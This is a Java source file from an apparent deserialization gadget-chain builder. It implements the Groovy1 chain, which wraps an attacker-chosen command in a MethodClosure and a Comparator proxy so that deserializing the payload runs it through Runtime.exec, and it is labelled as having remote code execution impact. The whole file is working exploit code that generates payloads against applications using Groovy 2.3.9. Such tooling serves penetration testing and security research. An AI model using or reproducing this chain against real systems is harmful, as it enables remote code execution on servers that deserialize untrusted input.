package org.ses.gadgetbuilder.chains1;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;

import java.lang.reflect.Proxy;
import java.util.Comparator;

@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({ Authors.FROHOFF })
@Impact(Impact.RCE)
public class Groovy1 extends GadgetChain<CompareTrampoline> {

    public Groovy1(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "compare");
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Groovy1.class.getClassLoader(), new Class[] {Comparator.class}, closure);
        return new TrampolineConnector(comparator, null, null);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.codehaus.groovy.runtime.ConversionHandler.invoke() (Proxy)\n" +
                "org.codehaus.groovy.runtime.ConvertedClosure.invokeCustom()\n" +
                "org.codehaus.groovy.runtime.MethodClosure.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "org.codehause.groovy.runtime.dgm$748.doMethodInvoke()\n" +
                "org.codehause.groovy.runtime.ProcessGroovyMethods.execute()\n" +
                "java.lang.Runtime.exec()";
    }
}
